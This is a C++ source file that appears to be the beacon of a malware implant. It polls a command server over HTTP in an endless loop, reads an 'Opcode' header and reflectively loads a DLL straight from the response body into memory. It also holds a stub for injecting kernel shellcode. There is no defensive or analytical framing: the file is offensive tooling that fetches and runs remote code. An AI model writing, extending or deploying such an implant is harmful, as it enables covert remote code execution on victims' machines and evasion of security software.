#include "pch.h"
#include "HttpClient.h"

DWORD WINAPI HttpClient::FetchFromServerLoop(LPVOID Seconds) {
    for (;;) {
        FetchFromServer();
        ::Sleep(*(DWORD*)Seconds * 1000);
    }
}

void HttpClient::FetchFromServer() {
    try {
        net::io_context io_context;

        tcp::resolver resolver(io_context);

        beast::tcp_stream stream(io_context);

        auto const results = resolver.resolve("127.0.0.1", "1230");

        // Make the connection on the IP address we get from a lookup
        stream.connect(results);

        //for (;;) {

            // Set up an HTTP GET request message
        http::request<http::string_body> req{ http::verb::get, ".", 11 };

        //req.set(http::field::keep_alive);
        //
        // Send the HTTP request to the remote host
        http::write(stream, req);

        // This dataFromServer is used for reading and must be persisted
        beast::flat_buffer buffer;

        // Declare a container to hold the response
        http::response<http::dynamic_body> res;

        // Receive the HTTP response
        http::read(stream, buffer, res);


        for (auto const& field : res) {
            if (field.name_string() == "Opcode") {
                size_t bodysSize = res.body().size();

                void* dataFromServer = VirtualAlloc(NULL, bodysSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

                buffer_copy(boost::asio::buffer((char*)dataFromServer, bodysSize), res.body().data(), bodysSize);

                int opcode;
                std::from_chars(field.value().data(), field.value().data() + field.value().size(), opcode);

                BYTE* outputBuffer = nullptr;
                size_t outputBufferSize = 0;
                if (RequestHandler(static_cast<ServerOpcode>(opcode), dataFromServer, bodysSize, outputBuffer, &outputBufferSize)) {
                    // TODO: Send a response to the server
                }

                ::VirtualFree(dataFromServer, bodysSize, MEM_RELEASE);
                break;
            }
            //}
        }
    }
    catch (...) {

    }
}

bool HttpClient::RequestHandler(ServerOpcode opcode, const void* inputBuffer, size_t inputBufferLength, void* outputBuffer, size_t* outputBufferLength) {
    bool success = false;
    PVOID hModule;

    switch (opcode)
    {
    case ServerOpcode::LoadLibraryReflectively:
        hModule = ReflectiveLibraryLoader::MemoryLoadLibrary((PVOID)inputBuffer, inputBufferLength);
        if (hModule) success = true;
        break;
    case ServerOpcode::InjectKernelShellcode:
        // TODO
        break;
    default:
        break;
    }
    return success;
}